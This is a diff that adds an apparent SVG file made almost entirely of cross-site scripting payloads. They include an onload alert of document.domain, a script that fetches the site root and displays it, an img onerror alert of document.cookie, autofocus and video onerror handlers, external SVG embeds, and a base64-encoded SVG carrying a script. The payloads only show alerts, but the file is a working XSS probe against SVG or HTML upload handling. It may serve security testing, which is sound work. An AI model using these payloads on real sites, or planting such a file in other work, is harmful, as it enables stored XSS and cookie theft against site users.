@@ -1,0 +1,47 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+
+
+
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   
+<script>
+x=new XMLHttpRequest
+x.open('get','/')
+x.send()
+x.onreadystatechange=function(){
+  if(x.readyState==4){
+    alert(x.response)
+  }
+}
+</script>
+
+
+<script type="text/javascript">
+      alert(XSS);
+   </script>
+
+
+</svg>
+
+
+<img src="x" onerror="alert(document.cookie)" />
+
+
+<embed src="https://a11.org/test.svg" alt="" />
+
+<embed src="https://a11.org/test.svg" alt="" />
+
+ <input autofocus="" type="text" onfocus="write(1)" />
+
+ <input autofocus="" type="text" onfocus="write(1)" />
+
+
+
+
+ <video><source onerror="alert(video xss)" /></video>
+
+
+<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always" />
